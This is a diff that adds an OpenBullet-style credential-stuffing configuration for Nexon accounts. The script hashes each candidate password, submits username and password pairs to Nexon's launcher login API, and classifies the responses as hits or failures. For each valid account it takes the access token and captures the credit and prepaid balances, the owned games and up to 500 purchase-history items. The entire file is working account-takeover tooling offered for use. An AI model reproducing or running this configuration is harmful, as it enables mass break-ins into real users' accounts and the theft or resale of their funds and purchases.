@@ -1,0 +1,78 @@
+[SETTINGS]
+{
+  "Name": "Nexon",
+  "SuggestedBots": 1,
+  "LastModified": "2019-05-07T21:01:27.7876253-04:00",
+  "AdditionalInfo": "",
+  "Author": "LethalLuck",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Hash SHA512 "<PASS>" -> VAR "Sha512" 
+
+REQUEST POST "https://www.nexon.com/account-webapi/login/launcher" 
+  CONTENT "{\"id\":\"<USER>\",\"password\":\"<Sha512>\",\"client_id\":\"7853644408\",\"device_id\":\"7d1936ed67f7de93aa196279109565ba5084677227d60f8cb4f277ce3f594cc0\",\"scope\":\"us.launcher.all\",\"auto_login\":true}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "id_token" 
+  KEYCHAIN Failure OR 
+    KEY "NOT_EXIST_USER" 
+    KEY "WRONG_PASSWORD" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "PROTECTED_USER_N_MODE" 
+
+PARSE "<SOURCE>" LR "\"access_token\":\"" "\"" -> VAR "Token" 
+
+REQUEST GET "https://api.nexon.io/purchase/v1/balance" 
+  
+  HEADER "User-Agent: NexonLauncher.nxl-18.13.15-74-1f1cc1f-coreapp-2.3.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+
+PARSE "<SOURCE>" LR "\"credit_balance\":" "," -> CAP "Credits" 
+
+PARSE "<SOURCE>" LR "\"prepaid_balance\":" "," -> CAP "Prepaid" 
+
+PARSE "<SOURCE>" LR "\"total_balance\":" "}" -> CAP "Total" 
+
+REQUEST GET "https://api.nexon.io/game-user/v1/library" 
+  
+  HEADER "User-Agent: NexonLauncher.nxl-18.13.15-74-1f1cc1f-coreapp-2.3.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+
+PARSE "<SOURCE>" LR "\"displayName\":\"" "\"" Recursive=TRUE -> CAP "Games Played" 
+
+REQUEST GET "https://www.nexon.com/wallet-api/history?index=1&count=500&type=all" 
+  
+  HEADER "User-Agent: NexonLauncher.nxl-18.13.15-74-1f1cc1f-coreapp-2.3.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <Token>" 
+
+PARSE "<SOURCE>" LR "\"ItemName\":\"" "\"" Recursive=TRUE -> CAP "Purchases" 
+
